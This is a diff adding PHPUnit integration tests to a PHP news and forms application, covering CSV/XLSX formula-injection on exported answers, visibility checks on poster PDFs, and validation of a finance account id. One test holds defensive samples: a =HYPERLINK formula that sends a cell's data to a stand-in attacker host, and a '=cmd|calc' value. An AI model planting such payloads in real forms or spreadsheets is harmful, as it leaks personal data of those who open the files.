@@ -544,6 +544,42 @@ class NewsIntegrationTest extends TestCase
         $this->assertStringStartsWith('PK', $response->getBody());
     }
 
+    /**
+     * POST /news/{id}/form/submit is public, so a form answer is
+     * attacker-controlled. It must never become a live formula in the
+     * XLSX a chief opens — the CSV/spreadsheet formula-injection class,
+     * where =HYPERLINK(...) would exfiltrate the other rows' PII on open.
+     */
+    public function testExportedAnswersAreWrittenAsTextNotFormulas(): void
+    {
+        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
+        $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
+        $formId = $this->formRepository->create($articleId, NewsForm::ACCESS_PUBLIC, NewsForm::RESPONSE_LIMIT_UNLIMITED, null, null, false, 'chief', false, null);
+        $fieldId = $this->fieldRepository->create($formId, 0, FormField::TYPE_SHORT_TEXT, 'Nom', true, null, null, null, null, null);
+
+        $payload = '=HYPERLINK("https://evil.example/?d="&A2,"Cliquez")';
+        $this->responseRepository->create($formId, null, null, '=cmd|calc', [$fieldId => $payload], null, null);
+
+        $response = $this->formController->exportResponses(
+            new Request('GET', '/news/' . $articleId . '/form/responses/export', [], [], [], []),
+            ['id' => (string) $articleId]
+        );
+
+        $tmp = tempnam(sys_get_temp_dir(), 'news_export_') . '.xlsx';
+        file_put_contents($tmp, $response->getBody());
+        $sheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($tmp)->getActiveSheet();
+        @unlink($tmp);
+
+        // Column 1 = contact, column 2 = the answer. Both are attacker text.
+        $contactCell = $sheet->getCell([1, 2]);
+        $answerCell = $sheet->getCell([2, 2]);
+
+        $this->assertSame(\PhpOffice\PhpSpreadsheet\Cell\DataType::TYPE_STRING, $answerCell->getDataType());
+        $this->assertSame($payload, $answerCell->getValue(), 'stored verbatim as text, not evaluated');
+        $this->assertSame(\PhpOffice\PhpSpreadsheet\Cell\DataType::TYPE_STRING, $contactCell->getDataType());
+        $this->assertSame('=cmd|calc', $contactCell->getValue());
+    }
+
     public function testEditResponsePageRendersForOwnerWhileOpen(): void
     {
         $articleId = $this->articleRepository->create('Camp', Article::VISIBILITY_PUBLIC, false, null, null, $this->chiefAccountId);
@@ -591,6 +627,36 @@ class NewsIntegrationTest extends TestCase
         $this->assertStringStartsWith('%PDF-', $response->getBody());
     }
 
+    /**
+     * The poster carries the article's title, its summary and a QR code to
+     * its short URL — so it needs show()'s visibility gate. Without it a
+     * chief blocked from an admin-visibility article at /news/{id} could
+     * still read all three straight out of the PDF.
+     */
+    public function testPosterIsRefusedForAnArticleTheViewerMayNotSee(): void
+    {
+        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
+        $id = $this->articleRepository->create('Secret CU', Article::VISIBILITY_ADMIN, false, null, null, $this->chiefAccountId, 'Résumé confidentiel.');
+        $this->articleRepository->setShortUrlCode($id, 'secret1');
+
+        $response = $this->newsController->poster(new Request('GET', '/news/' . $id . '/poster', [], [], [], []), ['id' => (string) $id]);
+
+        $this->assertSame(403, $response->getStatusCode());
+        $this->assertStringNotContainsString('%PDF-', $response->getBody());
+    }
+
+    public function testPosterIsServedForTheSameArticleToARoleThatMaySeeIt(): void
+    {
+        AuthSession::login($this->chiefAccountId, 'admin@test.com', 'admin');
+        $id = $this->articleRepository->create('Secret CU', Article::VISIBILITY_ADMIN, false, null, null, $this->chiefAccountId, 'Résumé confidentiel.');
+        $this->articleRepository->setShortUrlCode($id, 'secret2');
+
+        $response = $this->newsController->poster(new Request('GET', '/news/' . $id . '/poster', [], [], [], []), ['id' => (string) $id]);
+
+        $this->assertSame(200, $response->getStatusCode());
+        $this->assertStringStartsWith('%PDF-', $response->getBody());
+    }
+
     public function testPosterDownloadIncludesTheFeaturedImageWhenItExists(): void
     {
         AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
@@ -604,6 +670,87 @@ class NewsIntegrationTest extends TestCase
 
         $this->assertSame(200, $response->getStatusCode());
         $this->assertStringStartsWith('%PDF-', $response->getBody());
+    }
+
+    /**
+     * form_finance_account_id used to be stored verbatim, and later drove
+     * Service\ResponseService's createReceivable() — so an author could bind
+     * a form's payments to any account id at all, including a draft or
+     * archived one the picker never offered. It is now validated against the
+     * very list the picker is built from.
+     *
+     * @return array{0: NewsController, 1: string} controller + a valid CSRF token
+     */
+    private function controllerWithFinanceAccounts(): array
+    {
+        $financeAccount = $this->createMock(FinanceAccountInterface::class);
+        $financeAccount->method('getConfiguredAccounts')->willReturn([
+            ['id' => 42, 'name' => 'Compte unité', 'iban' => null, 'holder_name' => null, 'section_id' => null],
+        ]);
+
+        $controller = new NewsController(
+            $this->twig, $this->articleService, $this->formService, $this->responseService, new SeoKeywordService(null),
+            new PosterPdfService(), $this->scoutYearService, $this->settingService, $this->schedulerService, $this->userAccountRepository,
+            $this->memberService, $this->sectionService, new UploadHandler(new FileRepository($this->pdo), sys_get_temp_dir()),
+            new FileRepository($this->pdo), sys_get_temp_dir(), $this->journalService, $financeAccount
+        );
+
+        AuthSession::login($this->chiefAccountId, 'chief@test.com', 'chief');
+
+        return [$controller, CsrfGuard::generateToken()];
+    }
+
+    /**
+     * @return array<string, string>
+     */
+    private function formArticleBody(string $csrfToken, string $financeAccountId): array
+    {
+        return [
+            '_csrf_token' => $csrfToken,
+            'title' => 'Camp payant',
+            'summary' => 'Un résumé en une phrase.',
+            'body_html' => '<p>Bienvenue</p>',
+            'visibility' => 'public',
+            'has_form' => '1',
+            'form_access' => 'public',
+            'form_response_limit' => 'unlimited',
+            'form_response_role_min' => 'chief',
+            'form_finance_account_id' => $financeAccountId,
+            'fields_json' => (string) json_encode([
+                ['id' => null, 'field_type' => 'short_text', 'label' => 'Nom', 'is_required' => true, 'options_source' => null, 'options_manual' => null, 'capacity_max' => null, 'price_per_unit' => null, 'confirmation_text' => null],
+            ]),
+        ];
+    }
+
+    public function testAnUnofferedFinanceAccountIsNotBoundToTheForm(): void
+    {
+        [$controller, $csrfToken] = $this->controllerWithFinanceAccounts();
+
+        // 99 is not in getConfiguredAccounts() — never offered by the picker.
+        $request = new Request('POST', '/news', [], $this->formArticleBody($csrfToken, '99'), [], []);
+        $_FILES['image'] = $this->fakeUploadedImage();
+        $response = $controller->store($request, []);
+
+        $this->assertSame(302, $response->getStatusCode());
+        $article = $this->articleRepository->findAll()[0];
+        $form = $this->formService->findByArticleId($article->id);
+        $this->assertNotNull($form);
+        $this->assertNull($form->financeAccountId, 'an unoffered account must not be bound');
+    }
+
+    public function testAnOfferedFinanceAccountIsStillBoundNormally(): void
+    {
+        [$controller, $csrfToken] = $this->controllerWithFinanceAccounts();
+
+        $request = new Request('POST', '/news', [], $this->formArticleBody($csrfToken, '42'), [], []);
+        $_FILES['image'] = $this->fakeUploadedImage();
+        $response = $controller->store($request, []);
+
+        $this->assertSame(302, $response->getStatusCode());
+        $article = $this->articleRepository->findAll()[0];
+        $form = $this->formService->findByArticleId($article->id);
+        $this->assertNotNull($form);
+        $this->assertSame(42, $form->financeAccountId);
     }
 
     public function testStoreCreatesArticleWithFormAndRedirects(): void
